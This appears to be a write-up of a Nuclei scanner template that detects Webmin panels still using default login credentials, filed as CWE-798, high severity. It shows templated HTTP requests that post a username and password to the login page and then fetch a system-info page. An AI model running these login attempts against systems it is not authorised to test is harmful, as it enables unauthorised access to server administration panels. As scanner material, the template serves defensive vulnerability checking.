# Nuclei Template: Webmin - Default Login
**Template ID:** webmin-default-login
**Vulnerability Class:** Use of Hard-coded Credentials
**Severity:** High
**CWE:** CWE-798
**Source:** Nuclei Template (`webmin-default-login.yaml`)

## Vulnerability Information & PoC

## Description
Webmin default login credentials were discovered.

## Steps to reproduce / Exploit Payload
```http
POST /session_login.cgi HTTP/1.1
Host: {{Hostname}}
Cookie: redirect=1; testing=1
Origin: {{RootURL}}
Content-Type: application/x-www-form-urlencoded
Referer: {{RootURL}}
Accept-Encoding: gzip, deflate

user={{username}}&pass={{password}}

GET /sysinfo.cgi HTTP/1.1
Host: {{Hostname}}
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: {{RootURL}}
Accept-Encoding: gzip, deflate
```

## References
- https://webmin.com/
- https://doxfer.webmin.com/Webmin/Installing_Webmin
